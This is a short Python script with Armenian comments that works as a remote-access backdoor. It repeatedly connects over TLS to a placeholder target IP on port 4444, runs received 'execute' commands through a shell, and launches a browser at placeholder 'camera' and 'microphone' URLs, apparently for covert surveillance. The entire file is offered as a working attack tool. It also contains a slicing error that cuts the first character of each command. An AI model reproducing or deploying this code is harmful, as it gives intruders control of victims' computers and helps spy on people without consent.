import socket
import subprocess
import os
import threading
import time
import ssl

ip = 'TARGET_IP'  # Տղամարդու IP հասցեն
port = 4444  # Պորտը, որի վրա կլսենք

def connect_to_target(ip, port):
    while True:
        try:
            context = ssl.create_default_context()
            s = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=ip)
            s.connect((ip, port))
            print(f"Connected to {ip}:{port}")
            return s
        except:
            print(f"Retrying connection to {ip}:{port}")
            time.sleep(5)
def receive_commands(s):
    while True:
        try:
            data = s.recv(1024).decode()
            if data.lower() == 'exit':
                break
            elif data.lower() == 'open microphone':
                os.system("start microsoft-edge http://your-microphone-url.com")
            elif data.lower() == 'open camera':
                os.system("start microsoft-edge http://your-camera-url.com")
            elif data.lower().startswith('execute '):
                command = data[9:]
                subprocess.Popen(command, shell=True)
            else:
                s.send(data.encode())
        except:
            print("Connection lost. Reconnecting...")
            s = connect_to_target(ip, port)
            receive_commands(s)
def main():
    s = connect_to_target(ip, port)
    receive_commands(s)
if __name__ == '__main__':
    main()
